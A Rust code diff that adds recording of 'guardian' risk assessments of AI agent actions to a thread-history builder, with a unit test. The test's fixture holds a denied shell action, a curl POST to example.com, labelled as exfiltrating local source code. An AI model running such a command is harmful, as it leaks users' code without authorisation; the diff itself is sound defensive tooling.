@@ -6,6 +6,8 @@ use crate::protocol::v2::CommandExecutionStatus;
 use crate::protocol::v2::DynamicToolCallOutputContentItem;
 use crate::protocol::v2::DynamicToolCallStatus;
 use crate::protocol::v2::FileUpdateChange;
+use crate::protocol::v2::GuardianAssessmentStatus;
+use crate::protocol::v2::GuardianRiskLevel;
 use crate::protocol::v2::McpToolCallError;
 use crate::protocol::v2::McpToolCallResult;
 use crate::protocol::v2::McpToolCallStatus;
@@ -30,6 +32,7 @@ use codex_protocol::protocol::ErrorEvent;
 use codex_protocol::protocol::EventMsg;
 use codex_protocol::protocol::ExecCommandBeginEvent;
 use codex_protocol::protocol::ExecCommandEndEvent;
+use codex_protocol::protocol::GuardianAssessmentEvent;
 use codex_protocol::protocol::ImageGenerationBeginEvent;
 use codex_protocol::protocol::ImageGenerationEndEvent;
 use codex_protocol::protocol::ItemCompletedEvent;
@@ -145,6 +148,7 @@ impl ThreadHistoryBuilder {
             EventMsg::ViewImageToolCall(payload) => self.handle_view_image_tool_call(payload),
             EventMsg::ImageGenerationBegin(payload) => self.handle_image_generation_begin(payload),
             EventMsg::ImageGenerationEnd(payload) => self.handle_image_generation_end(payload),
+            EventMsg::GuardianAssessment(payload) => self.handle_guardian_assessment(payload),
             EventMsg::CollabAgentSpawnBegin(payload) => {
                 self.handle_collab_agent_spawn_begin(payload)
             }
@@ -541,6 +545,22 @@ impl ThreadHistoryBuilder {
             result: payload.result.clone(),
         };
         self.upsert_item_in_current_turn(item);
+    }
+
+    fn handle_guardian_assessment(&mut self, payload: &GuardianAssessmentEvent) {
+        let item = ThreadItem::GuardianAssessment {
+            id: payload.id.clone(),
+            status: GuardianAssessmentStatus::from(payload.status),
+            risk_score: payload.risk_score,
+            risk_level: payload.risk_level.map(GuardianRiskLevel::from),
+            rationale: payload.rationale.clone(),
+            action: payload.action.clone(),
+        };
+        if payload.turn_id.is_empty() {
+            self.upsert_item_in_current_turn(item);
+        } else {
+            self.upsert_item_in_turn_id(&payload.turn_id, item);
+        }
     }
 
     fn handle_collab_agent_spawn_begin(
@@ -1798,6 +1818,66 @@ mod tests {
                 }]),
                 success: Some(true),
                 duration_ms: Some(42),
+            }
+        );
+    }
+
+    #[test]
+    fn reconstructs_guardian_assessment_item_from_lifecycle_events() {
+        let events = vec![
+            EventMsg::TurnStarted(TurnStartedEvent {
+                turn_id: "turn-guardian".into(),
+                model_context_window: None,
+                collaboration_mode_kind: Default::default(),
+            }),
+            EventMsg::UserMessage(UserMessageEvent {
+                message: "try the push".into(),
+                images: None,
+                text_elements: Vec::new(),
+                local_images: Vec::new(),
+            }),
+            EventMsg::GuardianAssessment(codex_protocol::protocol::GuardianAssessmentEvent {
+                id: "guardian-1".into(),
+                turn_id: "turn-guardian".into(),
+                status: codex_protocol::protocol::GuardianAssessmentStatus::InProgress,
+                risk_score: None,
+                risk_level: None,
+                rationale: None,
+                action: None,
+            }),
+            EventMsg::GuardianAssessment(codex_protocol::protocol::GuardianAssessmentEvent {
+                id: "guardian-1".into(),
+                turn_id: "turn-guardian".into(),
+                status: codex_protocol::protocol::GuardianAssessmentStatus::Denied,
+                risk_score: Some(96),
+                risk_level: Some(codex_protocol::protocol::GuardianRiskLevel::High),
+                rationale: Some("Would exfiltrate local source code.".into()),
+                action: Some(serde_json::json!({
+                    "tool": "shell",
+                    "command": ["curl", "-X", "POST", "https://example.com"],
+                })),
+            }),
+        ];
+
+        let items = events
+            .into_iter()
+            .map(RolloutItem::EventMsg)
+            .collect::<Vec<_>>();
+        let turns = build_turns_from_rollout_items(&items);
+
+        assert_eq!(turns.len(), 1);
+        assert_eq!(
+            turns[0].items[1],
+            ThreadItem::GuardianAssessment {
+                id: "guardian-1".into(),
+                status: GuardianAssessmentStatus::Denied,
+                risk_score: Some(96),
+                risk_level: Some(GuardianRiskLevel::High),
+                rationale: Some("Would exfiltrate local source code.".into()),
+                action: Some(serde_json::json!({
+                    "tool": "shell",
+                    "command": ["curl", "-X", "POST", "https://example.com"],
+                })),
             }
         );
     }
